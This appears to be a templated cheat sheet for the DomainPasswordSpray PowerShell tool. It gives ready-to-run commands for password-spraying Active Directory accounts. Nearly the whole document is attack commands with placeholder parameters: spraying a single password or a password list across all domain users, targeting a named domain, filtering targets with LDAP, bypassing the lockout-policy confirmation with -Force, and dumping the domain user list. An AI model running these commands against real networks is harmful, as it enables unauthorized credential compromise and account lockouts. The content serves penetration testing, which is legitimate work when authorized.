# DomainPasswordSpray
> PowerShell tool to password-spray Active Directory from a domain-joined host, auto-gathering the user list and lockout policy.

<!-- tags: ad,password-spray,powershell,credentials,bruteforce -->

---

## import domainpasswordspray module
Load the DomainPasswordSpray functions into the current PowerShell session before spraying.

```bash
Import-Module .\DomainPasswordSpray.ps1
```

<!-- meta: risk=safe | phase=exploit | tags=powershell,import,setup -->

---

## spray password domain
Spray a single password across every domain user. Pulls the user list and lockout policy from the domain automatically and saves hits to a file.

```bash
Invoke-DomainPasswordSpray -Password {{PASSWORD:str:Spring2025!}} -OutFile {{OUTFILE:file:spray_success.txt}} -ErrorAction SilentlyContinue
```

<!-- meta: risk=med | phase=exploit | tags=spray,single-password,auto-users -->

---

## spray password userlist domain
Spray one password against a supplied user list instead of auto-gathering accounts from the domain.

```bash
Invoke-DomainPasswordSpray -UserList {{USERLIST:wordlist:users.txt}} -Password {{PASSWORD:str:Spring2025!}} -OutFile {{OUTFILE:file:spray_success.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=spray,userlist,single-password -->

---

## spray passlist domain
Spray a list of passwords across all domain users. Higher lockout risk — confirm the policy first.

```bash
Invoke-DomainPasswordSpray -PasswordList {{PASSLIST:wordlist:passwords.txt}} -OutFile {{OUTFILE:file:spray_success.txt}}
```

<!-- meta: risk=high | phase=exploit | tags=spray,passlist,lockout-risk -->

---

## spray password specific domain
Spray a password while targeting a specific domain by FQDN, useful from a host in a different/trusted domain.

```bash
Invoke-DomainPasswordSpray -Password {{PASSWORD:str:Spring2025!}} -Domain {{DOMAIN:domain:corp.local}} -OutFile {{OUTFILE:file:spray_success.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=spray,domain,fqdn -->

---

## spray password filter domain
Restrict the auto-gathered user list with an LDAP filter (for example, only accounts with a description set).

```bash
Invoke-DomainPasswordSpray -Password {{PASSWORD:str:Spring2025!}} -Filter "(description=*)" -OutFile {{OUTFILE:file:spray_success.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=spray,ldap-filter,targeted -->

---

## spray password force domain
Skip the lockout-policy confirmation prompt and spray without warning. Use only when you have verified the threshold yourself.

```bash
Invoke-DomainPasswordSpray -Password {{PASSWORD:str:Spring2025!}} -Force -OutFile {{OUTFILE:file:spray_success.txt}}
```

<!-- meta: risk=high | phase=exploit | tags=spray,force,no-prompt -->

---

## generate userlist domainpasswordspray
Dump the domain user list to a file without spraying, so you can review or filter accounts before an attack.

```bash
Get-DomainUserList -Domain {{DOMAIN:domain:corp.local}} | Out-File -Encoding ascii {{OUTFILE:file:users.txt}}
```

<!-- meta: risk=low | phase=enum | tags=userlist,enum,domain-users -->
